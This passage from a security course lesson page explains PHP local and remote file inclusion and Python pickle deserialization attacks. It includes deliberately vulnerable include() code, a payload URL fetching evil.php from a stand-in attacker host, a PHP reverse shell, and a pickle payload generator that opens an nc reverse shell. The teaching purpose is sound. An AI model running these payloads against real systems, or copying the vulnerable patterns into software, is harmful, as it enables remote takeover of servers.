This allows an external URL to be supplied to the include function.</p><p><img src=./assets/what-is-rfi-attack.png alt="RFI Attack"></p><p>The above definitions are very similar, so what is the exact difference between the two of them and how does an exploit affect the web application in each case?</p><h2 id=local-file-inclusion>Local File Inclusion</h2><p><strong>Local File Inclusion</strong> can be divided into subcategories based on the end target of the attack.</p><ol><li><p><strong>Path Traversal</strong> - which we have studied in a previous session.
It uses a local file path and enables the attacker to access the contents of arbitrary files.
The outcome of this attack is to read sensitive data and expose confidential information.</p></li><li><p><strong>Remote Code Execution (RCE)</strong> - which is a <strong>very dangerous vulnerability</strong>.
It could be present in web applications that offer the possibility of uploading arbitrary files without proper checks.
Once a malicious file was uploaded (such as a reverse shell), the attacker can compromise the entire system.</p></li></ol><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#8f5902;font-style:italic>// Get the filename from a GET input
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// Example - http://example.com/?file=filename.php
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#000>$file</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;file&#39;</span><span style=color:#000;font-weight:700>];</span>

    <span style=color:#8f5902;font-style:italic>// Unsafely include the file
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// Example - filename.php
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>include</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;directory/&#39;</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#000>$file</span><span style=color:#000;font-weight:700>);</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>Payload: <code>http://example.com/?file=../../uploads/evil.php</code></p><h2 id=remote-file-inclusion>Remote File Inclusion</h2><p>Exactly like in the case of <strong>Local File Inclusion</strong>, where the attacker is able to upload a reverse shell on the server, the <strong>Remote File Inclusion</strong> vulnerability lets the attacker include a remote file in the current web application and execute its contents.
This file could be a reverse shell and give the attacker <strong>full system control</strong>.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#8f5902;font-style:italic>// Get the filename from a GET input
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// Example - http://example.com/?file=index.php
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#000>$file</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;file&#39;</span><span style=color:#000;font-weight:700>];</span>

    <span style=color:#8f5902;font-style:italic>// Unsafely include the file
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// Example - index.php
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>include</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$file</span><span style=color:#000;font-weight:700>);</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>Payload: <code>http://example.com/?file=http://attacker.example.com/evil.php</code></p><p><strong>Note:</strong> Even though some web servers run as <strong>root</strong> (<strong>which is a very bad practice</strong>), most of them run as a special user (<strong>www-data</strong>) which doesn’t have root privileges.
This means that getting a reverse shell on a web server will grant you only the rights of the user running the website.
In order to get root access on the machine, further <strong>privilege escalation</strong> methods should be employed, which you will learn about in a future session.</p><h3 id=example-of-a-simple-reverse-shell-in-php>Example of a simple reverse shell in PHP:</h3><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#000>$sock</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>fsockopen</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;127.0.0.1&#34;</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>1234</span><span style=color:#000;font-weight:700>);</span>
    <span style=color:#000>$proc</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>proc_open</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;/bin/sh -i&#34;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87;font-weight:700>array</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#ce5c00;font-weight:700>=&gt;</span><span style=color:#000>$sock</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#ce5c00;font-weight:700>=&gt;</span><span style=color:#000>$sock</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#ce5c00;font-weight:700>=&gt;</span><span style=color:#000>$sock</span><span style=color:#000;font-weight:700>),</span> <span style=color:#000>$pipes</span><span style=color:#000;font-weight:700>);</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><h1 id=python-insecure-deserialization--pickle-module>Python Insecure Deserialization / <code>pickle</code> module</h1><p>We have looked at so many PHP vulnerabilities in this session, but you shouldn&rsquo;t be left with the impression that PHP is the only vulnerable language.
In this section we will approach an insecure object deserialization in a Python web application.</p><h2 id=python-pickle>Python <code>pickle</code></h2><p>In Python, the <code>pickle</code> module lets you serialize and deserialize data.
Essentially, this means that you can convert a Python object into a stream of bytes and then reconstruct it (including the object’s internal structure) later in a different process or environment by loading that stream of bytes.</p><p>When consulting the Python docs for pickle one cannot miss the following warning:</p><p><code>Warning: The pickle module is not secure. Only unpickle data you trust.</code></p><p>Let&rsquo;s have a look at how <code>pickle</code> handles your data. In Python you can serialize objects by using <code>pickle.dumps()</code>:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>pickle</span>

<span style=color:#000>pickle</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>dumps</span><span style=color:#000;font-weight:700>([</span><span style=color:#4e9a06>&#39;pickle&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;me&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>3</span><span style=color:#000;font-weight:700>])</span>
</code></pre></div><p>The pickled representation we’re getting back from dumps will look like this:</p><p><code>b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e'</code></p><p>And now reading the serialized data back in&mldr;</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>pickle</span>

<span style=color:#000>pickle</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>loads</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#39;</span><span style=color:#4e9a06>\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#4e9a06>]</span><span style=color:#4e9a06>\x94</span><span style=color:#4e9a06>(</span><span style=color:#4e9a06>\x8c\x06</span><span style=color:#4e9a06>pickle</span><span style=color:#4e9a06>\x94\x8c\x02</span><span style=color:#4e9a06>me</span><span style=color:#4e9a06>\x94</span><span style=color:#4e9a06>K</span><span style=color:#4e9a06>\x01</span><span style=color:#4e9a06>K</span><span style=color:#4e9a06>\x02</span><span style=color:#4e9a06>K</span><span style=color:#4e9a06>\x03</span><span style=color:#4e9a06>e.&#39;</span><span style=color:#000;font-weight:700>)</span>
</code></pre></div><p>&mldr;will give us our list object back:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;pickle&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;me&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>3</span><span style=color:#000;font-weight:700>]</span>
</code></pre></div><p>What is actually happening behind the scenes is that the byte-stream created by dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in.</p><p>Not every object can be serialized (e.g. file handles) and pickling and unpickling certain objects (like functions or classes) comes with restrictions.
The Python docs give you a good overview of what can and cannot be pickled.</p><p>While in most cases you don’t need to do anything special to make an object &ldquo;picklable&rdquo;, pickle still allows you to define a custom behavior for the pickling process for your class instances.</p><p>Reading a bit further down in the docs we can see that implementing <code>__reduce__</code> is exactly what we would need to get code execution, when viewed from an attacker’s perspective:</p><blockquote><p>The <code>__reduce__()</code> method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the &ldquo;reduce value&rdquo;). [&mldr;]
When a tuple is returned, it must be between two and six items long.
Optional items can either be omitted, or <code>None</code> can be provided as their value.
The semantics of each item are in order:</p><ul><li>A callable object that will be called to create the initial version of the object.</li><li>A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. [&mldr;]</li></ul></blockquote><p>So by implementing <code>__reduce__</code> in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run.
While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.</p><p>A sample payload generator which opens a reverse shell can be analyzed below:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>pickle</span>
<span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>base64</span>
<span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>os</span>


<span style=color:#204a87;font-weight:700>class</span> <span style=color:#000>RCE</span><span style=color:#000;font-weight:700>:</span>
    <span style=color:#204a87;font-weight:700>def</span> <span style=color:#000>__reduce__</span><span style=color:#000;font-weight:700>(</span><span style=color:#3465a4>self</span><span style=color:#000;font-weight:700>):</span>
        <span style=color:#000>cmd</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | &#39;</span>
               <span style=color:#4e9a06>&#39;/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f&#39;</span><span style=color:#000;font-weight:700>)</span>
        <span style=color:#204a87;font-weight:700>return</span> <span style=color:#000>os</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>system</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>cmd</span><span style=color:#000;font-weight:700>,)</span>


<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000>__name__</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#4e9a06>&#39;__main__&#39;</span><span style=color:#000;font-weight:700>:</span>
    <span style=color:#000>pickled</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>pickle</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>dumps</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>RCE</span><span style=color:#000;font-weight:700>())</span>
    <span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>base64</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>urlsafe_b64encode</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>pickled</span><span style=color:#000;font-weight:700>))</span>
</code></pre></div><p>This code will generate a reverse shell, which opens the possibility of <strong>RCE</strong> on the target machine.
In order to accomplish this, you also need to make sure the port is accessible to the Internet.
You may find some simple instructions for how to do this <a href=https://securiumsolutions.com/blog/reverse-shell-using-tcp/>here</a>, using <code>ngrok</code>.
Again, it&rsquo;s one of the most dangerous vulnerabilities for a web application, whatever the programming language was chosen for the back-end (be it <strong>PHP</strong>, <strong>Python</strong>, <strong>JavaScript</strong>, <strong>Ruby</strong>, etc.), and the programmer should be aware and protect it against malicious actors.
Also, always research the functions and modules used inside your application to prevent such vulnerabilities.</p><h1 id=wrap-up>Wrap Up</h1><p>As you have seen so far, even a small mistake, such as using <code>==</code> instead of <code>===</code>, can cause your application to break at unexpected input.
From an attacker standpoint, you can never know if the programmer was careful enough when writing the code, so you should always research and test what exploits can the application be vulnerable to, specific to the language / framework used.</p><p>The most important aspect we kept talking about during all the sessions is to never trust the user input.
He can have malicious thoughts and purposefully try to break the application or he can unknowingly send a bad request and achieve the same result.
In conclusion, the code should be properly tested before being put in production and the user input should always be carefully sanitized.</p><h1 id=further-reading>Further Reading</h1><ul><li><a href=https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf>https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf</a></li><li><a href=https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/>https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/</a></li><li><a href=https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/>https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/</a></li><li><a href=https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/>https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/</a></li><li><a href=https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09>https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09</a></li><li><a href=https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/>https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/</a></li><li><a href=https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/>https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/</a></li><li><a href=https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/>https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/</a></li><li><a href=https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/>https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/</a></li><li><a href=https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace</a></li><li><a href=https://www.whitehatsec.com/blog/magic-hashes/>https://www.whitehatsec.com/blog/magic-hashes/</a></li><li><a href=https://davidhamann.de/2020/04/05/exploiting-python-pickle/>https://davidhamann.de/2020/04/05/exploiting-python-pickle/</a></li></ul><h1 id=activities>Activities</h1><ul><li><a href=https://sss-web.cyberedu.ro/challenge/5eb0b460-0849-11ed-bb4d-935fa24b7bf2>Breaking Hashes</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/9f845f10-0849-11ed-8fc0-2d7dcc866b21>Defaced Website</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/bb9ee7b0-0849-11ed-a68c-f70dace328dc>Handy Tool</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/d3a9cb70-0849-11ed-8436-9bcd29625f3f>Jar of Pickles</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/ee04f8d0-0849-11ed-851c-af7641b8a719>Meme Uploader</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/06d17960-084a-11ed-95a0-a9f50e1b83e7>Pro Replacer</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/1cb64670-084a-11ed-8430-29d0d2a909b5>TODO App</a></li></ul><style>.feedback--answer{display:inline-block}.feedback--answer-no{margin-left:1em}.feedback--response{display:none;margin-top:1em}.feedback--response__visible{display:block}</style><div class=d-print-none><h2 class=feedback--title>Feedback</h2><p class=feedback--question>Was this page helpful?</p><button class="btn btn-primary mb-4 feedback--answer feedback--answer-yes">Yes</button>
<button class="btn btn-primary mb-4 feedback--answer feedback--answer-no">No</button><p class="feedback--response feedback--response-yes">Glad to hear it! Please <a href=https://github.com/security-summer-school/security-summer-school.github.io/issues/new>tell us how we can improve</a>.</p><p class="feedback--response feedback--response-no">Sorry to hear that. Please <a href=https://github.com/security-summer-school/security-summer-school.github.io/issues/new>tell us how we can improve</a>.</p></div><script>const yesButton=document.querySelector('.feedback--answer-yes'),noButton=document.querySelector('.feedback--answer-no'),yesResponse=document.querySelector('.feedback--response-yes'),noResponse=document.querySelector('.feedback--response-no'),disableButtons=()=>{yesButton.disabled=!0,noButton.disabled=!0},sendFeedback=b=>{if(typeof ga!='function')return;const a={command:'send',hitType:'event',category:'Helpful',action:'click',label:window.location.pathname,value:b};ga(a.command,a.hitType,a.category,a.action,a.label,a.value)};yesButton.addEventListener('click',()=>{yesResponse.classList.add('feedback--response__visible'),disableButtons(),sendFeedback(1)}),noButton.addEventListener('click',()=>{noResponse.classList.add('feedback--response__visible'),disableButtons(),sendFeedback(0)})</script><br><div class="text-muted mt-5 pt-3 border-top"></div></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Discord aria-label=Discord><a class=text-white target=_blank rel=noopener href=https://bit.ly/DiscordSecuritySummerSchool aria-label=Discord><i class="fab fa-discord"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Facebook aria-label=Facebook><a class=text-white target=_blank rel=noopener href=https://www.facebook.com/SSSUPB/ aria-label=Facebook><i class="fab fa-facebook"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Youtube aria-label=Youtube><a class=text-white target=_blank rel=noopener href=https://bit.ly/YoutubeSecuritySummerSchool aria-label=Youtube><i class="fab fa-youtube"></i></a></li></ul></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/security-summer-school aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2022 Open-Source Contributors. All Rights Reserved</small></div></div></div></footer></div><script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js integrity=sha384-+YQ4JLhjyBLPDQt//I+STsc9iw4uQqACwlvpslubQzn4u2UU2UFM80nGisd026JF crossorigin=anonymous></script><script src=/js/tabpane-persist.js></script><script src=/js/main.min.5c74b870c6953931a705f390a49c7e4c0a842ec5c83b24354758dd674343ed0d.js integrity="sha256-XHS4cMaVOTGnBfOQpJx+TAqELsXIOyQ1R1jdZ0ND7Q0=" crossorigin=anonymous></script></body></html>